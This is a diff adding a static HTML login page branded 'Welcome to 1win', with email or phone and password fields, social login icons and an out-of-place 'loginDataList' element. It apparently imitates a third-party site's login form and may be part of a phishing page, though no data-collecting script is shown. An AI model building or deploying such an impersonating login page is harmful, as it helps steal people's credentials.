@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <link rel="stylesheet" href="styles.css">
+    
+</head>
+<div id="loginDataList"></div>
+
+<body>
+    <div class="login-container">
+        <div class="login-header">Login</div> <div class="close-icon">✕</div>
+
+        <div class="welcome"><p>Welcome to 1win</p> 
+            <!-- <img id="tabImage" src="p.png" alt="Tab Image" style="width: 100px; margin: 0 auto 15px; display: block;">
+        </div> -->
+        <!-- <img id="tabImage" src="phone.jpg" alt="Tab Image" style="width: 100px; display: block; margin: 10px auto;"> -->
+
+
+        <div class="tab-buttons">
+            <button class="tab-btn" id="phoneTab">
+                <img id="phoneIcon" src="p.png" alt="emoji" width="20" height="20"> Phone
+            </button>
+            <button class="tab-btn active" id="emailTab">
+                <img id="emailIcon" src="e-active.png" alt="emoji" width="20" height="20"> Email
+            </button>
+        </div>
+        
+
+        <div class="phone-container" id="phoneInput" style="display: none;">
+            <input type="tel" id="phone" placeholder="00000 00000" inputmode="numeric">
+        </div>
+        <div class="error-message" id="phoneError">Please enter a valid 10-digit phone number.</div>
+
+        <div class="input-group" id="emailInput">
+            <i class="fa fa-envelope"></i>
+            <input type="email" id="email" placeholder="Email">
+        </div>
+        <div class="error-message" id="emailError">Check your e-mail address for errors</div>
+
+        <div class="input-group">
+            <i class="fa fa-lock"></i>
+            <input type="password" id="password" placeholder="Password">
+        </div>
+
+        <span class="forgot-password">Forgot password?</span>
+        <button class="login-btn" id="loginBtn" disabled>Login</button>
+        <hr style="border: 1px solid #dfdfdfea; margin: 20px 0;">
+
+        <div class="social-icons">
+            <img src="0.png" alt="Google">
+            <img src="1.png" alt="VK">
+            <img src="2.png" alt="Telegram">
+            <img src="3.png" alt="@mail">
+            <img src="4.png" alt="Yahoo">
+            <img src="5.png" alt="Yandex">
+            <img src="6.png" alt="Steam">
+        </div>
+        <div class="register-link">
+            Still no account? <a href="#">Register</a>
+        </div>
+    </div>   
+     
+    <script src="script.js"></script>
+<!-- <script src="server.js"></script> -->
+</body>
+</html>
+
